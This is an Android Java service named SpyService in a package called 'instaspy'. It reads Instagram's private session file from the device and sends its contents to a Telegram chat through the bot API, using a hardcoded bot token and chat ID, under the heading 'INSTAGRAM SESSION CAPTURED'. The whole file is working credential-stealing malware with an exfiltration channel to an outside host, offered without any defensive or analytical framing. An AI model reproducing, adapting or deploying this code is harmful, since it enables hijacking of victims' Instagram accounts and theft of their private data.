package com.example.instaspy;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class SpyService extends Service {
    private static final String TAG = "InstaSpy";
    private static final String TELEGRAM_BOT_TOKEN = "8841728340:AAFKyjKUVAvKVyQdGXyZg9PGVIXpANl9Gc4";
    private static final String TELEGRAM_CHAT_ID = "6055414562";
    
    // Path to Instagram's session file (Standard Android Path)
    private static final String INSTA_SESSION_PATH = "/data/data/com.instagram.android/app_oscillsessions";
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Spy Service Started");
        
        // Read the session file
        String sessionData = readSessionFile();
        if (sessionData != null) {
            sendToTelegram(sessionData);
        } else {
            Log.e(TAG, "Could not read session file");
        }
        
        return START_STICKY;
    }

    private String readSessionFile() {
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new FileReader(INSTA_SESSION_PATH))) {
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }
        } catch (IOException e) {
            Log.e(TAG, "Error reading file", e);
        }
        return sb.toString();
    }

    private void sendToTelegram(String data) {
        new Thread(() -> {
            try {
                String message = String.format("🔥 <b>INSTAGRAM SESSION CAPTURED</b>\n\n<code>%s</code>", 
                    data.length() > 1000 ? data.substring(0, 1000) : data);
                
                String url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
                
                // URL Encoding
                String encodedMessage = URLEncoder.encode(message, StandardCharsets.UTF_8.toString());
                String encodedChatId = URLEncoder.encode(TELEGRAM_CHAT_ID, StandardCharsets.UTF_8.toString());
                
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setDoOutput(true);
                
                String postData = "chat_id=" + encodedChatId + "&text=" + encodedMessage + "&parse_mode=HTML";
                conn.getOutputStream().write(postData.getBytes());
                
                int response = conn.getResponseCode();
                Log.i(TAG, "Telegram Response: " + response);
                
            } catch (Exception e) {
                Log.e(TAG, "Error sending to Telegram", e);
            }
        }).start();
    }
        }
